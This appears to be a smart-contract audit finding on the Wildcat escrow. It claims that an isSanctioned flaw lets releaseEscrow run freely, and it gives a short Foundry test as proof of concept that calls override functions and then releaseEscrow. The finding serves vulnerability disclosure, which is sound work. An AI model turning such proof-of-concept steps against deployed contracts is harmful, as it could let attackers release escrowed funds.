# Vulnerability details

## Impact
Due to a flaw in the judgment condition of the isSanctioned function, the releaseEscrow function can be called arbitrarily.

## Proof of Concept
、
Calling the removeSanctionOverride function or overrideSanction function will not trigger CanNotReleaseEscrow.

```
  function testCanReleaseEscrow() public {
    address borrower = address(1);
    address account = address(2);
    address asset = address(new MockERC20());

    WildcatSanctionsEscrow escrow = WildcatSanctionsEscrow(
      sentinel.createEscrow(borrower, account, asset)
    );
    
    vm.startPrank(borrower);
    sentinel.removeSanctionOverride(account);
    escrow.releaseEscrow();
    sentinel.overrideSanction(account);
    escrow.releaseEscrow();
    vm.stopPrank();
  }
```
